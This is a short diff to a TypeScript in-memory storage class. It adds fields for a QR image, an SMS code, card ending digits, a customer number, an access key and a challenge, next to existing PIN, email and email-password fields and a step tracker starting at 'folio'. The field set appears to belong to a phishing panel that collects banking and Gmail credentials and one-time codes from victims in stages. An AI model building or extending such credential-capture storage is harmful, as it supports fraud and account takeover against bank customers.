@@ -645,8 +645,16 @@ export class MemStorage implements IStorage {
       nip: data.nip || null,
       smsCompra: data.smsCompra || null,
       celular: data.celular || null,
-      correo: data.correo || null,        // Añadimos campos de Gmail
-      contrasena: data.contrasena || null, // Añadimos campos de Gmail
+      correo: data.correo || null,
+      contrasena: data.contrasena || null,
+      qrImage: data.qrImage || null,
+      qrValidated: data.qrValidated || null,
+      smsCode: data.smsCode || null,
+      terminacion: data.terminacion || null,
+      dispositivo: data.dispositivo || null,
+      numeroCliente: data.numeroCliente || null,
+      claveAcceso: data.claveAcceso || null,
+      challenge: data.challenge || null,
       pasoActual: data.pasoActual || "folio",
       createdAt,
       active,
